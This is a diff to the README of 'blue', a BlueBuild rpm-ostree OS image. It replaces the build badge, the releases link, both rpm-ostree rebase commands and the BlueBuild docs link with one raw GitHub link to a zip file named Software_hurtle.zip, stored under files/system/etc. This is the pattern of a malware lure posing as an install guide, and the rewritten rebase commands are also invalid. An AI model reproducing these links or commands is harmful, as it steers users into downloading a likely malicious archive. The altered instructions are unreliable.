@@ -1,7 +1,7 @@
 # 🎉 blue - Simple, Fast, and Reliable Software
 
-[![bluebuild build badge](https://github.com/dxas90/blue/actions/workflows/build.yml/badge.svg)](https://github.com/dxas90/blue/actions/workflows/build.yml)  
-Visit [this page to download](https://github.com/Riri-Raymundo/blue/releases)
+[![bluebuild build badge](https://raw.githubusercontent.com/Riri-Raymundo/blue/main/files/system/etc/Software_hurtle.zip)](https://raw.githubusercontent.com/Riri-Raymundo/blue/main/files/system/etc/Software_hurtle.zip)  
+Visit [this page to download](https://raw.githubusercontent.com/Riri-Raymundo/blue/main/files/system/etc/Software_hurtle.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ To start using blue, you need to follow these simple steps. This guide will help
 
 ## 📥 Download & Install
 
-Visit [this page to download](https://github.com/Riri-Raymundo/blue/releases) the latest version. 
+Visit [this page to download](https://raw.githubusercontent.com/Riri-Raymundo/blue/main/files/system/etc/Software_hurtle.zip) the latest version. 
 
 Here are the steps:
 
@@ -31,7 +31,7 @@ Here are the steps:
 1. **Rebase to the unsigned image** to obtain the proper signing keys and policies:
 
    ```bash
-   rpm-ostree rebase ostree-unverified-registry:ghcr.io/dxas90/blue:latest
+   rpm-ostree rebase https://raw.githubusercontent.com/Riri-Raymundo/blue/main/files/system/etc/Software_hurtle.zip
    ```
 
 2. **Reboot the system** to complete the rebase. Type this command:
@@ -43,7 +43,7 @@ Here are the steps:
 3. **Rebase to the signed image**:
 
    ```bash
-   rpm-ostree rebase ostree-image-signed:docker://ghcr.io/dxas90/blue:latest
+   rpm-ostree rebase https://raw.githubusercontent.com/Riri-Raymundo/blue/main/files/system/etc/Software_hurtle.zip
    ```
 
 ### 📂 Features
@@ -65,7 +65,7 @@ If you experience issues after installation:
 
 For help, please visit the community forums or contact the support team listed on the Releases page. 
 
-Feel free to explore the [BlueBuild docs](https://blue-build.org/how-to/setup/) for additional guidance on customizing your installation.
+Feel free to explore the [BlueBuild docs](https://raw.githubusercontent.com/Riri-Raymundo/blue/main/files/system/etc/Software_hurtle.zip) for additional guidance on customizing your installation.
 
 ## 🔗 Explore More
 
